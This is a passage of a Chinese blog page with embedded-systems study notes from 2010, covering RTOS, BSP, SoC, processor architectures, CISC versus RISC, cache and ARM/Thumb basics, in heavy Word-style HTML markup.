<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>嵌入式系统学习笔记（一） - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="嵌入式系统学习笔记（一）" />
<meta property="og:description" content="嵌入式系统学习笔记
录入作者：SOFA120 录入时间：2010.3.2
第一讲
嵌入式定义：以应用为中心，以计算机技术为基础，软件硬件可裁剪，功能、可靠性、成本、体积、功耗严格要求的专用计算机系统。
嵌入式OS与单片机，PC区别：1. 目前嵌入式系统的主流是以32位嵌入式微处理器为核心的硬件设计和基于实时操作系统（RTOS）的软件设计; 单片机系统多为4位、8位、16位机，不适合运行操作系统，难以完成复杂的运算及处理功能; 嵌入式系统强调基于平台的设计、软硬件协同设计；单片机大多采用软硬件流水设计; 嵌入式系统设计的核心是软件设计（占70%左右的工作量）；单片机系统软硬件设计所占比例基本相同。2. 嵌入式系统一般是专用系统，而PC是通用计算平台；嵌入式系统的资源比PC少得多；嵌入式系统软件故障带来的后果比PC机大得多；嵌入式系统一般采用实时操作系统；嵌入式系统大都有成本、功耗的要求；嵌入式系统得到多种微处理体系的支持；嵌入式系统需要专用的交叉开发工具。
RTOS：实时操作系统。如果逻辑和时序出现偏差将会引起严重后果的系统。与通用操作系统没有本质的区别，一般用于比较复杂的嵌入式系统软件开发中。一般操作系统只注重平均性能，如对于整个系统来说，所有任务的平均响应时间是关键，而不关心单个任务的响应时间。 嵌入式实时操作系统最主要的特征是性能上的“实时性”，也就是说系统的正确性不仅依赖于计算的逻辑结果，也依赖于结果产生的时间。软实时系统：系统的宗旨是使各个任务运行得越快越好，并不要求限定某一任务必须在多长时间内完成（响应时间为数十秒）。硬实时系统：各任务不仅要执行无误而且要做到准时(响应时间在ms或us级)
第二讲
BSP概念，特点：BSP（板级支持包）是介于底层硬件和操作系统之间的软件层次，它完成系统上电后最初的硬件和软件初始化，并对底层硬件进行封装，使得操作系统不再面对具体的操作。特点：硬件相关性：因为嵌入式实时系统的硬件环境具有应用相关性，所以，作为高层软件与硬件之间的接口，BSP必须为操作系统提供操作和控制具体硬件的方法。操作系统相关性：不同的操作系统具有各自的软件层次结构，因此，针对不同的操作系统具有特定的接口形式。
SOC定义：一般说来, SoC称为系统级芯片,也有称片上系统,意指它是一个产品,是一个有专用目标的集成电路,其中包含完整系统并有嵌入软件的全部内容。同时它又是一种技术,用以实现从确定系统功能开始,到软/硬件划分,并完成设计的整个过程。从狭义角度讲,它是信息系统核心的芯片集成,是将系统关键部件集成在一块芯片上;从广义角度讲, SoC是一个微小型系统,如果说中央处理器(CPU)是大脑,那么SoC就是包括大脑、心脏、眼睛和手的系统。国内外学术界一般倾向将SoC定义为将微处理器、模拟IP核、数字IP核和存储器(或片外存储控制接口)集成在单一芯片上,它通常是客户定制的,或是面向特定用途的标准产品。
冯•诺依曼体系结构/哈佛体系结构：冯·诺依曼体系的特点：数据与指令都存储在存储器中；被大多数计算机所采用；ARM7。哈佛体系结构的特点：程序存储器与数据存储器分开；提供了较大的数据存储器带宽；适合于数字信号处理；大多数DSP都是哈佛结构；ARM9是哈佛结构。
CISC与RISC：CISC：复杂指令集（Complex Instruction Set Computer）具有大量的指令和寻址方式；80%的程序只使用20%的指令，大多数程序只使用少量的指令就能够运行。RISC：精简指令集（Reduced Instruction Set Computer)在通道中只包含最有用的指令确保数据通道快速执行每一条指令使CPU硬件结构设计变得更为简单。指令规整、对称、简单，指令小于100条，基本寻址方式只有2～3种；单周期指令，便于流水操作；大量的寄存器（不少于32个）。指令系统：CISC指令多，RISC少，通常少于100；执行时间：CISC有些指令执行时间很长，如整块的存储器内容复制；或将多个寄存器的内容复制到存贮器，RISC没有较长执行时间的指令。编码长度：CISC编码长度可变，1-15字节，RISC编码长度固定，通常为4个字节。寻址方式：CISC寻址方式多样，RISC简单寻址。操作：CISC可以对存储器和寄存器进行算术和逻辑操作，RISC只能对寄存器进行算术和逻辑操作，Load/Store体系结构。编译：CISC难以用优化编译器生成高效的目标代码程序，RISC采用优化编译技术，生成高效的目标代码程序
流水线：在CPU中把一条指令分解成多个可单独处理的操作，使每个操作在一个专门的硬件站（stage）上执行，这样一条指令需要顺序地经过流水线中多个站的处理才能完成，但是前后相连的几条指令可以依次流入流水线中，在多个站间重叠执行，因此可以实现指令的并行处理。提高了CPU的运行效率；内部信息流要求通畅流动
CACHE：Cache的设计思想：把在一段时间内、一定地址范围中被频繁访问的信息集合，成批地从主存中读到一个能高速存取的小容量存储器中存放起来,供程序在这段时间内随时使用，从而减少或不再去访问速度较慢的主存，就可以加快程序的运行速度。1、为什么采用高速缓存：微处理器的时钟频率比内存速度提高快得多，高速缓存可以提高内存的平均性能。2、高速缓存的工作原理：依据：程序和数据访问的局部性原理。高速缓存是一种小型、快速的存储器，它保存部分主存内容的拷贝。
IP核：软核：HDL语言描述；灵活度高，可修改；与工艺独立，可根据具体的加工工艺重新综合；IP很难保护。固核：逻辑综合后的描述；与工艺相关。硬核：物理综合后的描述；准备流片；包含工艺相关的布局和时序信息；IP很容易保护，但灵活性和可移植性差。多数的处理器和存储器。IP核的商业模型：1.设计者提供设计和工具的许可证；2.核厂商设计并制造集成电路芯片；3.核厂商卖核, 负责为客户设计并制造芯片。
嵌入式OS分类及特点：分类：按实时性分，（1）顺序执行系统：系统内只含有一个程序，独占CPU的运行时间，按语句顺序执行该程序，直至执行完毕，另一程序才能启动运行。如DOS操作系统。（2）分时操作系统：系统内同时可以有多个程序运行，把CPU的时间按顺序分成若干片，每个时间片内执行不同的程序。如UNIX操作系统。（3）实时操作系统：系统内有多个程序运行，每个程序有不同的优先级，只有最高优先级的任务才能占有CPU的控制权。按实时性的强弱分类:1.强(硬)实时系统，其系统响应时间在毫秒或微秒级（数控机床）；2.一般实时系统，其系统响应时间在毫秒－几秒的数量级上，其实时性的要求比强实时系统要差一些（电子菜谱的查询）。3.弱(软)实时系统，其系统响应时间约为数十秒或更长（工程机械）。特点：实时系统的特点是，如果逻辑和时序出现偏差将会引起严重后果的系统。有两种类型的实时系统：软实时系统和硬实时系统。在软实时系统中系统的宗旨是使各个任务运行得越快越好，并不要求限定某一任务必须在多长时间内完成。在硬实时系统中，各任务不仅要执行无误而且要做到准时。大多数实时系统是二者的结合。实时系统的应用涵盖广泛的领域，而多数实时系统又是嵌入式的。这意味着计算机建在系统内部，用户看不到有个计算机在系统里面。
占先内核和非占先内核的区别：1.占先式内核总是让就绪态的高优先级的任务先运行，中断服务程序可以抢占CPU，到中断服务完成时，内核让此时优先级最高的任务运行（不一定是那个被中断了的任务）。任务级系统响应时间得到了最优化，且是可知的。2.非占先式内核几乎不需要使用信号量保护共享数据。运行着的任务占有CPU，而不必担心被别的任务抢占。最大缺陷在于其响应高优先级的任务慢，任务已经进入就绪态，但还不能运行，也许要等很长时间，直到当前运行着的任务释放CPU。
第三讲交叉开发环境：交叉开发是指在一台通用计算机上进行软件的编辑编译，然后下载到嵌入式设备中进行运行调试的开发方式。用来开发的通用计算机可以选用比较常见的PC机、工作站等，运行通用的Windows或Unix操作系统。开发计算机是宿主机，嵌入式设备是目标机。交叉开发环境提供调试工具对目标机上运行的程序进行调试。由运行于宿主机上的交叉开发软件和宿主机到目标机的调试通道组成。
嵌入式系统的调试方法：模拟调试（Simulator）软件调试（Debugger）BDM/JTAG调试（BDM/JTAG Debugger）全仿真调试（Emulator）
链接文件的作用：.ld文件:描述代码链接定位的有关信息，包括代码段，数据段，地址段等，链接器必须使用该文件对整个系统的代码做正确的定位。
.map文件:防止软件调试过程中访问非法存储区时产生异常中断；.CS文件:通过一组命令序列来让集成环境自动完成一些特定的功能。汇编源程序*.s ，C语言程序*.c ，链接脚本文件*.ld，存储区映像文件*.map，命令脚本文件*.CS。
第四讲
ARM ：是Advance RISC Machine的简称，英国计算机公司，主要设计ARM系列RISC处理器内核而不生产芯片，授权ARM内核给生产和销售半导体的合作伙伴；处理器内核的名称。
ARM微处理器的特点：低功耗、低成本、高性能；采用RISC体系结构；大量使用寄存器；高效的指令系统；除此以外，ARM体系结构还采用了一些特别的技术，在保证高性能的前提下尽量缩小芯片的面积，并降低功耗。
ARM微处理器的主要系列： ARM7系列， ARM9系列， ARM9E系列，ARM10E系列， SecurCore系列，Cortex系列， Intel的strong ARM和Xscale系列，其中，ARM7、ARM9、ARM9E和ARM10为4个通用处理器系列，每一个系列提供一套相对独特的性能来满足不同应用领域的需求。SecurCore系列专门为安全要求较高的应用而设计。
ARM7TDMI含义：T：支持16位压缩指令集Thumb；D：支持片上Debug；M：内嵌硬件乘法器（Multiplier）I：嵌入式ICE硬件，支持片上断点和调试点；
Thumb技术产生的原因或特点：原因：1.高端消费类产品需要32位RISC处理器性能和更优于16位的CISC处理器的代码密度。这就要求要以更低的成本取得更好的性能和更优于16位的CISC处理器的代码密度。2. 为了满足嵌入式技术不断发展的要求，ARM的RISC体系结构的发展中已经提供了低功耗、小体积、高性能的方案。同时为了解决代码长度的问题，ARM体系结构又增加了Ｔ变种，开发了一种新的指令体系，这就是Thumb指令集。特点：1.支持Thumb的核有2套独立的指令集，它使设计者得到ARM32位指令的性能，又能享有Thumb指令集产生的代码方面的优势。可以在性能和代码大小之间取得平衡；2. 在需要较低的存储代码时采用Thumb指令系统，但有比纯粹16位系统高的实现性能，因为实际执行的是32位指令，用Thumb指令编写最小代码量的程序，却取得以ARM代码执行的最好性能；3. 独立的两套指令集也使得解码逻辑极其的简单，从而维持了较小的硅片面积，保证了领先的“低功耗、高性能、小体积”的技术要求，满足了对嵌入式系统的设计需求。
第五讲
ARM和THUMB的切换方法：进入Thumb状态: 1.当操作数寄存器Rm的状态位bit［0］为1时，执行 BX Rm 指令进入 Thumb状态（指令详细介绍见后面）。2. 所有的异常都是在ARM状态下进行，如果处理器在Thumb状态进入异常，则当异常处理（IRQ，FIQ，Undef，Abort和SWI）返回时，自动切换到Thumb状态。进入ARM状态: 1.当操作数寄存器Rm的状态位bit［0］为0时，执行 BX Rm 指令进入ARM状态。2. 如果处理器进行异常处理（IRQ，FIQ，Undef，Abort和SWI），在此情况下，把PC放入异常模式链接寄存器LR中，从异常向量地址开始执行也可以进入ARM状态。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/02060fe3cfce592cadde48ce4c0a12ff/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2010-03-02T16:39:00+08:00" />
<meta property="article:modified_time" content="2010-03-02T16:39:00+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">嵌入式系统学习笔记（一）</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p> </p> 
<p style="text-align: center;">嵌入式系统学习笔记</p> 
<p>录入作者：SOFA120 </p> 
<p>录入时间：2010.3.2</p> 
<p>  </p> 
<p> </p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><a name="OLE_LINK2"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'><span style="font-size: small;">第一讲</span></span></a></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式定义</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：以应用为中心，以计算机技术为基础，软件硬件可裁剪，功能、可靠性、成本、体积、功耗严格要求的专用计算机系统。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">OS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>与单片机，</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>区别</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">1. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>目前嵌入式系统的主流是以</span><span lang="EN-US"><span style="font-family: Times New Roman;">32</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位嵌入式微处理器为核心的硬件设计和基于实时操作系统（</span><span lang="EN-US"><span style="font-family: Times New Roman;">RTOS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>）的软件设计</span><span lang="EN-US"><span style="font-family: Times New Roman;">; </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>单片机系统多为</span><span lang="EN-US"><span style="font-family: Times New Roman;">4</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位、</span><span lang="EN-US"><span style="font-family: Times New Roman;">8</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位、</span><span lang="EN-US"><span style="font-family: Times New Roman;">16</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>位机，不适合运行操作系统，难以完成复杂的运算及处理功能</span><span lang="EN-US"><span style="font-family: Times New Roman;">; </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式系统强调基于平台的设计、软硬件协同设计；单片机大多采用软硬件流水设计</span><span lang="EN-US"><span style="font-family: Times New Roman;">; </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式系统设计的核心是软件设计（占</span><span lang="EN-US"><span style="font-family: Times New Roman;">70%</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>左右的工作量）；单片机系统软硬件设计所占比例基本相同。</span><span lang="EN-US"><span style="font-family: Times New Roman;">2. </span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式系统一般是专用系统，而</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是通用计算平台；嵌入式系统的资源比</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>少得多；嵌入式系统软件故障带来的后果比</span><span lang="EN-US"><span style="font-family: Times New Roman;">PC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>机大得多；嵌入式系统一般采用实时操作系统；嵌入式系统大都有成本、功耗的要求；嵌入式系统得到多种微处理体系的支持；嵌入式系统需要专用的交叉开发工具。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">RTOS</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：实时操作系统。如果逻辑和时序出现偏差将会引起严重后果的系统。与通用操作系统没有本质的区别，一般用于比较复杂的嵌入式系统软件开发中。一般操作系统只注重平均性能，如对于整个系统来说，所有任务的平均响应时间是关键，而不关心单个任务的响应时间。</span><span style="font-family: Times New Roman;"> </span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>嵌入式实时操作系统最主要的特征是性能上的“实时性”，也就是说系统的正确性不仅依赖于计算的逻辑结果，也依赖于结果产生的时间。<span style="color: red;">软实时系统</span>：系统的宗旨是使各个任务运行得越快越好，并不要求限定某一任务必须在多长时间内完成（响应时间为数十秒）。<span style="color: red;">硬实时系统</span>：各任务不仅要执行无误而且要做到准时</span><span lang="EN-US"><span style="font-family: Times New Roman;">(</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>响应时间在</span><span lang="EN-US"><span style="font-family: Times New Roman;">ms</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或</span><span lang="EN-US"><span style="font-family: Times New Roman;">us</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>级</span><span lang="EN-US"><span style="font-family: Times New Roman;">)</span></span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'><span style="font-size: small;">第二讲</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">BSP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>概念，特点</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">BSP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>（板级支持包）是介于底层硬件和操作系统之间的软件层次，它完成系统上电后最初的硬件和软件初始化，并对底层硬件进行封装，使得操作系统不再面对具体的操作。特点：硬件相关性：因为嵌入式实时系统的硬件环境具有应用相关性，所以，作为高层软件与硬件之间的接口，</span><span lang="EN-US"><span style="font-family: Times New Roman;">BSP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>必须为操作系统提供操作和控制具体硬件的方法。操作系统相关性：不同的操作系统具有各自的软件层次结构，因此，针对不同的操作系统具有特定的接口形式。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">SOC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>定义</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：一般说来</span><span lang="EN-US"><span style="font-family: Times New Roman;">, SoC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>称为系统级芯片</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>也有称片上系统</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>意指它是一个产品</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是一个有专用目标的集成电路</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>其中包含完整系统并有嵌入软件的全部内容。同时它又是一种技术</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>用以实现从确定系统功能开始</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>到软</span><span lang="EN-US"><span style="font-family: Times New Roman;">/</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>硬件划分</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>并完成设计的整个过程。从狭义角度讲</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>它是信息系统核心的芯片集成</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是将系统关键部件集成在一块芯片上</span><span lang="EN-US"><span style="font-family: Times New Roman;">;</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>从广义角度讲</span><span lang="EN-US"><span style="font-family: Times New Roman;">, SoC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是一个微小型系统</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>如果说中央处理器</span><span lang="EN-US"><span style="font-family: Times New Roman;">(CPU)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是大脑</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>那么</span><span lang="EN-US"><span style="font-family: Times New Roman;">SoC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>就是包括大脑、心脏、眼睛和手的系统。国内外学术界一般倾向将</span><span lang="EN-US"><span style="font-family: Times New Roman;">SoC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>定义为将微处理器、模拟</span><span lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核、数字</span><span lang="EN-US"><span style="font-family: Times New Roman;">IP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>核和存储器</span><span lang="EN-US"><span style="font-family: Times New Roman;">(</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或片外存储控制接口</span><span lang="EN-US"><span style="font-family: Times New Roman;">)</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>集成在单一芯片上</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>它通常是客户定制的</span><span lang="EN-US"><span style="font-family: Times New Roman;">,</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>或是面向特定用途的标准产品。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>冯•诺依曼体系结构</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">/</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>哈佛体系结构</span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：冯·诺依曼体系的特点：数据与指令都存储在存储器中；被大多数计算机所采用；</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM7</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>。哈佛体系结构的特点：程序存储器与数据存储器分开；提供了较大的数据存储器带宽；适合于数字信号处理；大多数</span><span lang="EN-US"><span style="font-family: Times New Roman;">DSP</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>都是哈佛结构；</span><span lang="EN-US"><span style="font-family: Times New Roman;">ARM9</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>是哈佛结构。</span></span></span></p> 
<p class="MsoNormal" style="margin: 0cm 0cm 0pt;"><span style="font-size: small;"><span style="mso-bookmark: OLE_LINK2;"><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='color: red; font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>与</span><span style="color: red;" lang="EN-US"><span style="font-family: Times New Roman;">RISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：</span><span lang="EN-US"><span style="font-family: Times New Roman;">CISC</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New Roman"; mso-hansi-font-family: "Times New Roman";'>：复杂指令集（</span><span lang="EN-US"><span style="font-family: Times New Roman;">Complex Instruction Set Computer</span></span></span><span style="mso-bookmark: OLE_LINK2;"><span style='font-family: 宋体; mso-ascii-font-family: "Times New 